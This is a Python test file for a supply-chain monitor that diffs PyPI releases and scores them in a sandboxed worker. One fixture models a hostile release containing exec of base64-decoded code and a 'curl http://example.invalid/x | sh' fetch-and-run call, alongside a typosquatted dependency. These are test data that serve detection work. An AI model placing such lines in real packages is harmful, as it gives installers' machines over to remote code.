"""The parse sandbox (spec §3.1-§3.2). C1: analyze(backend="off") scans in-process through the same compute +
parent-rules path the worker uses. C2: the worker, its Seatbelt/systemd launch, the probe, and the parent's checks
on everything the worker sends back. Tests marked `seatbelt` run the real macOS sandbox."""
import dataclasses, errno, hashlib, io, json, os, pathlib, re, shutil, signal, subprocess, sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from pydiffwatch import __main__ as cli
from pydiffwatch import differ, engine, fetcher, orchestrator, rules, sandbox, store
from pydiffwatch.config import Config
from pydiffwatch.models import Download, FiredRule, NewRelease, TriageResult
from pydiffwatch.rules import Rule
from tests.fixtures.build_fixtures import make_sdist

_RULES = pathlib.Path(__file__).parent.parent / "rules" / "community"


def _dl(new, prior=None, **kw):
    base = dict(package="p", version="1.1", prior_version="1.0" if prior is not None else None,
                is_new_package=prior is None, new_blob=make_sdist(new), prior_blob=make_sdist(prior) if prior else None,
                prior_error=None, maintainer_metadata=None, added_dep_findings=[], requires_dist_change=None,
                description=None)
    return Download(**{**base, **kw})


def test_an_unknown_backend_is_a_sandbox_error():
    with pytest.raises(sandbox.SandboxError, match="unknown sandbox 'nope'"):
        sandbox.analyze(Config(), _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"}), None, [], backend="nope")


def test_analyze_renders_signals_from_the_parents_data():
    dl = _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"},
             added_dep_findings=[{"name": "reqeusts", "reason": "typosquat", "target": "requests"}],
             requires_dist_change={"added": ["reqeusts"], "removed": []})
    owners = {"current": {"roles": ["mallory"]}, "prior": {"roles": ["alice"]}}
    d, _, _ = sandbox.analyze(Config(), dl, owners, rules.load_rules(_RULES))
    assert "dependency reqeusts: typosquat of requests (a popular package)" in d.signals
    assert "maintainer set changed: alice -> mallory" in d.signals
    assert d.added_dep_findings == dl.added_dep_findings


def test_parent_rules_replace_the_scans_and_keep_ruleset_order(monkeypatch):
    rs = [Rule("maint", "maintainer", 20, {"maintainer_changed": True}),
          Rule("code-a", "code", 30, {}), Rule("dep-a", "dep", 25, {})]
    scan_tr = TriageResult(0.0, [FiredRule("code-a", 30.0, "x.py", (1, 1)),
                                 FiredRule("dep-a", 99.0, "forged", (0, 0))], False)   # a scan's dep result
    parent = TriageResult(0.0, [FiredRule("dep-a", 25.0, "reqeusts", (0, 0)),
                                FiredRule("maint", 20.0, "<ownership>", (0, 0))], False)
    monkeypatch.setattr(engine, "triage", lambda d, cfg, rs_, mc=None: parent)
    d = dataclasses.replace(sandbox.differ.build_diff(fetcher.extract_download(
        Config(), _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"}))), signals="")
    tr = sandbox._with_parent_rules(Config(), _dl({"p/a.py": b""}, {"p/a.py": b""}), d, scan_tr, None, rs)
    assert [f.rule for f in tr.fired_rules] == ["maint", "code-a", "dep-a"]      # ruleset order
    assert [f.file for f in tr.fired_rules if f.rule == "dep-a"] == ["reqeusts"]   # the parent's, not the scan's
    assert tr.score == 75.0 and tr.escalate is True


def test_a_refused_new_sdist_raises_out_of_analyze():
    dl = _dl({f"p/m{i}.py": b"" for i in range(5)}, {"p/a.py": b""})
    with pytest.raises(fetcher.RefusedToExtract, match="members"):
        sandbox.analyze(Config(max_members=3), dl, None, [])


def test_build_diff_renders_no_signals_analyze_does():
    from pydiffwatch import differ
    dl = _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"},
             added_dep_findings=[{"name": "x", "reason": "brand-new"}])
    art = fetcher.extract_download(Config(), dl)
    assert differ.build_diff(art).signals == ""
    d, _, _ = sandbox.analyze(Config(), dl, None, [])
    assert d.signals == "dependency x: brand-new on PyPI"


# ---- C2 shared helpers ----

_REPO = pathlib.Path(__file__).resolve().parent.parent
_OWNERS = {"current": {"roles": ["mallory"]}, "prior": {"roles": ["alice"]}}
_OLD = {"scn/__init__.py": b"x = 1\n", "setup.py": b"from setuptools import setup\nsetup(name='scn')\n"}
_NEW = {"scn/__init__.py": b"import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
                           b"os.system('curl http://example.invalid/x | sh')\n",
        "setup.py": b"from setuptools import setup\nsetup(name='scn', entry_points={'console_scripts': "
                    b"['scn=scn:main', 'scn2=scn:main2'], 'pytest11': ['scn=scn']})\n",
        "scn/_native.so": b"\x7fELF\x02\x01\x01"}


def _cfg(tmp_path, **kw):
    return Config(**{**dict(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "cache",
                            lock_path=tmp_path / "lock", reviewer_enabled=False), **kw})


def _scan_dl(**kw):
    """One update that fires a code, a binary, a dep and (with _OWNERS) a maintainer rule, and escalates."""
    return _dl(_NEW, _OLD, package="scn", **{
        "added_dep_findings": [{"name": "reqeusts", "reason": "typosquat", "target": "requests"}],
        "requires_dist_change": {"added": ["reqeusts>=1"], "removed": ["requests>=1"]}, **kw})


# ---- C2: the request (parent -> worker) ----

def test_the_request_round_trips_without_the_parents_facts(tmp_path):
    cfg, rs, dl = _cfg(tmp_path), rules.load_rules(_RULES), _scan_dl()
    line, rest = sandbox._encode_input(cfg, dl, rs).split(b"\n", 1)
    got_cfg, got_dl, got_rs = sandbox._decode_input(json.loads(line), io.BytesIO(rest))
    # Review Focus 3: every path arrives absolute (the worker never resolves one against its own cwd)
    assert got_cfg == dataclasses.replace(cfg, **{k: Path(getattr(cfg, k)).resolve() for k in sandbox._PATH_FIELDS})
    assert got_dl == dataclasses.replace(dl, added_dep_findings=[], requires_dist_change=None)
    assert got_rs == rs                                       # the parent's rules, JSON round-tripped


def test_a_short_request_is_an_error():
    line, rest = sandbox._encode_input(Config(), _scan_dl(), []).split(b"\n", 1)
    with pytest.raises(ValueError, match="ended before its sdists did"):
        sandbox._decode_input(json.loads(line), io.BytesIO(rest[:-1]))


# ---- C2: the reply (worker -> parent) ----

def test_a_genuine_reply_decodes_to_the_in_process_scan():
    cfg, rs, dl = Config(), rules.load_rules(_RULES), _scan_dl()
    art, d, tr = sandbox.compute(cfg, dl, rs)
    got_d, got_tr, prior_error = sandbox._decode_output(sandbox._encode_output(art, d, tr), cfg, dl, rs)
    assert got_d == dataclasses.replace(d, added_dep_findings=[])     # analyze adds the parent's own
    assert got_tr == tr and prior_error == art.prior_error


def _tamper(path, value):
    def edit(out):
        node = out
        for k in path[:-1]:
            node = node[k]
        node[path[-1]] = value
    return edit


_MALFORMED = {
    "a hunk's added lines as a string": _tamper(("diff", "changed", 0, "hunks", 0, "added"), "not a list"),
    "a renamed file": _tamper(("diff", "changed", 0, "change_kind"), "renamed"),
    "a path that is not a string": _tamper(("diff", "changed", 0, "path"), 7),
    "changed as an object": _tamper(("diff", "changed"), {"a": 1}),
    "a rule the parent never loaded": _tamper(("triage", "fired_rules", 0, "rule"), "made-up-rule"),
    "an infinite weight": _tamper(("triage", "fired_rules", 0, "weight"), float("inf")),
    "a negative weight": _tamper(("triage", "fired_rules", 0, "weight"), -1),
    "a weight as a string": _tamper(("triage", "fired_rules", 0, "weight"), "7"),
    "a boolean weight": _tamper(("triage", "fired_rules", 0, "weight"), True),
    "a weight too big for a float": _tamper(("triage", "fired_rules", 0, "weight"), 10 ** 400),
    "three line numbers": _tamper(("triage", "fired_rules", 0, "lines"), [1, 2, 3]),
    "surface_omitted as a string": _tamper(("diff", "surface_omitted"), "3"),
    "prior_error as a number": _tamper(("prior_error",), 5),
    "another release": _tamper(("diff", "version"), "9.9"),
    "another package": _tamper(("diff", "package"), "other"),
    "is_first_release as a string": _tamper(("diff", "is_first_release"), "no"),
    "a binary with a float size": _tamper(("diff", "added_binaries", 0, "size"), 1.5),
    "description missing": lambda out: out["diff"].pop("description"),
}


@pytest.mark.parametrize("what", sorted(_MALFORMED))
def test_a_malformed_reply_is_rejected(what):
    cfg, rs, dl = Config(), rules.load_rules(_RULES), _scan_dl()
    out = json.loads(sandbox._encode_output(*sandbox.compute(cfg, dl, rs)))
    _MALFORMED[what](out)
    with pytest.raises(sandbox.SandboxError):
        sandbox._decode_output(json.dumps(out).encode(), cfg, dl, rs)


@pytest.mark.parametrize("raw", [b"\x00not json", b"[1, 2]", b"\xff\xfe", b"[" * 100_000])
def test_a_reply_that_is_not_a_json_object_is_rejected(raw):
    with pytest.raises(sandbox.SandboxError):
        sandbox._decode_output(raw, Config(), _scan_dl(), [])


def test_a_refusal_inside_the_box_is_a_refusal_and_any_other_error_a_sandbox_error():
    with pytest.raises(fetcher.RefusedToExtract, match="^members$"):
        sandbox._decode_output(b'{"error": "members", "error_type": "RefusedToExtract"}', Config(), _scan_dl(), [])
    with pytest.raises(sandbox.SandboxError, match="^sandbox worker failed: BadGzipFile: Not a gzipped file"):
        sandbox._decode_output(b'{"error": "BadGzipFile: Not a gzipped file"}', Config(), _scan_dl(), [])


_DETERMINISM = ("import sys\n"
                "from pydiffwatch import rules, sandbox\n"
                "from pydiffwatch.config import Config\n"
                "from tests.test_sandbox import _RULES, _scan_dl\n"
                "sys.stdout.buffer.write(sandbox._encode_output(*sandbox.compute(Config(), _scan_dl(), "
                "rules.load_rules(_RULES))))\n")


def test_the_reply_is_byte_identical_across_processes():
    # lesson iii: sort_keys, and no set crosses the pipe (two hash seeds would reorder one that leaked)
    outs = [subprocess.run([sys.executable, "-c", _DETERMINISM], cwd=_REPO, capture_output=True, check=True,
                           env={**os.environ, "PYTHONHASHSEED": seed}).stdout for seed in ("1", "2")]
    assert outs[0] == outs[1] and outs[0].startswith(b'{"diff": {"added_binaries": [')
